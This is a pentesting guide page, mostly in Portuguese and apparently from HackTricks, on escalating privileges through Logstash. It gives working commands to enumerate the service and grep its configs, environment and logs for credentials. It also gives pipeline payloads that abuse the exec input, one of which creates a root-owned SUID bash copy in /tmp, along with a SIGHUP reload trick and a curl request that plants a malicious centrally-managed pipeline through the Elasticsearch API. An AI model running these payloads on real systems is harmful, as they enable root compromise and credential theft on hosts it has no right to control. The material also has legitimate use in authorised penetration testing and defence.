# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash é usado para **coletar, transformar e encaminhar logs** através de um sistema conhecido como **pipelines**. Esses pipelines são compostos pelas fases **input**, **filter** e **output**. Um aspecto interessante surge quando o Logstash opera em uma máquina comprometida.

### Configuração de pipelines

Os pipelines são configurados no arquivo **/etc/logstash/pipelines.yml**, que lista os caminhos das configurações dos pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Este arquivo revela onde os **.conf** files, contendo configurações de pipeline, estão localizados. Ao empregar um **Elasticsearch output module**, é comum que **pipelines** incluam **Elasticsearch credentials**, que frequentemente possuem privilégios extensos devido à necessidade do Logstash de gravar dados no Elasticsearch. Wildcards em caminhos de configuração permitem que o Logstash execute todos os pipelines correspondentes no diretório designado.

Se o Logstash for iniciado com `-f <directory>` em vez de `pipelines.yml`, **todos os arquivos dentro desse diretório são concatenados em ordem lexicográfica e analisados como uma única configuração**. Isso cria 2 implicações ofensivas:

- Um arquivo adicionado como `000-input.conf` ou `zzz-output.conf` pode alterar como o pipeline final é montado
- Um arquivo malformado pode impedir o carregamento de todo o pipeline, então valide os payloads cuidadosamente antes de confiar no auto-reload

### Fast Enumeration on a Compromised Host

Em uma máquina onde o Logstash está instalado, inspecione rapidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Verifique também se a API de monitoramento local está acessível. Por padrão, ela escuta em **127.0.0.1:9600**, o que geralmente é suficiente após obter acesso ao host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Isso normalmente fornece IDs do pipeline, detalhes de tempo de execução e confirmação de que seu pipeline modificado foi carregado.

Credenciais recuperadas do Logstash frequentemente desbloqueiam **Elasticsearch**, então verifique [esta outra página sobre Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Para tentar privilege escalation, primeiro identifique o usuário sob o qual o serviço Logstash está sendo executado, tipicamente o usuário **logstash**. Garanta que você atende **um** destes critérios:

- Possuir **write access** a um arquivo de pipeline **.conf** **ou**
- O arquivo **/etc/logstash/pipelines.yml** usa um wildcard, e você pode escrever na pasta de destino

Além disso, **um** destas condições deve ser atendida:

- Capacidade de reiniciar o serviço Logstash **ou**
- O arquivo **/etc/logstash/logstash.yml** tem **config.reload.automatic: true** definido

Dado um wildcard na configuração, criar um arquivo que corresponda a esse wildcard permite execução de comandos. Por exemplo:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Aqui, **interval** determina a frequência de execução em segundos. No exemplo dado, o comando **whoami** é executado a cada 120 segundos, com sua saída direcionada para **/tmp/output.log**.

Com **config.reload.automatic: true** em **/etc/logstash/logstash.yml**, o Logstash detectará e aplicará automaticamente novas ou modificadas configurações de pipeline sem necessidade de reinício. Se não houver wildcard, ainda é possível fazer modificações nas configurações existentes, mas é aconselhável cautela para evitar interrupções.

### More Reliable Pipeline Payloads

O input plugin `exec` ainda funciona nas releases atuais e requer ou um `interval` ou um `schedule`. Ele executa fazendo **forking** da JVM do Logstash, então se a memória estiver baixa seu payload pode falhar com `ENOMEM` em vez de rodar silenciosamente.

A more practical privilege-escalation payload is usually one that leaves a durable artifact:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Se você não tem permissão para reiniciar, mas pode enviar um sinal ao processo, o Logstash também suporta um recarregamento acionado por **SIGHUP** em sistemas do tipo Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Tenha em mente que nem todo plugin é compatível com recarga automática. Por exemplo, o input **stdin** impede a recarga automática, então não presuma que `config.reload.automatic` sempre detectará suas alterações.

### Roubando Segredos do Logstash

Antes de focar apenas na execução de código, colha os dados aos quais o Logstash já tem acesso:

- Credenciais em texto simples são frequentemente hardcoded dentro de `elasticsearch {}` outputs, `http_poller`, JDBC inputs, ou configurações relacionadas à cloud
- Configurações seguras podem residir em **`/etc/logstash/logstash.keystore`** ou outro diretório `path.settings`
- A senha do keystore é frequentemente fornecida através de **`LOGSTASH_KEYSTORE_PASS`**, e instalações baseadas em pacote comumente a obtêm de **`/etc/sysconfig/logstash`**
- A expansão de variáveis de ambiente com `${VAR}` é resolvida na inicialização do Logstash, então vale inspecionar o ambiente do serviço

Verificações úteis:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Isso também vale a pena verificar porque **CVE-2023-46672** mostrou que Logstash poderia registrar informações sensíveis em logs em circunstâncias específicas. Em um host post-exploitation, logs antigos do Logstash e entradas do `journald` podem, portanto, revelar credenciais mesmo se a configuração atual referenciar o keystore em vez de armazenar segredos inline.

### Abuso do gerenciamento centralizado de pipelines

Em alguns ambientes, o host **não** depende de arquivos `.conf` locais. Se **`xpack.management.enabled: true`** estiver configurado, o Logstash pode puxar pipelines gerenciados centralmente do Elasticsearch/Kibana, e após habilitar esse modo os configs locais de pipeline deixam de ser a fonte da verdade.

Isso significa um caminho de ataque diferente:

1. Recupere credenciais do Elastic das configurações locais do Logstash, do keystore ou dos logs
2. Verifique se a conta possui o privilégio de cluster **`manage_logstash_pipelines`**
3. Crie ou substitua um pipeline gerenciado centralmente para que o host Logstash execute seu payload no próximo intervalo de polling

A API do Elasticsearch usada por esse recurso é:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Isto é especialmente útil quando os arquivos locais são somente leitura, mas o Logstash já está registrado para buscar pipelines remotamente.

## Referências

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
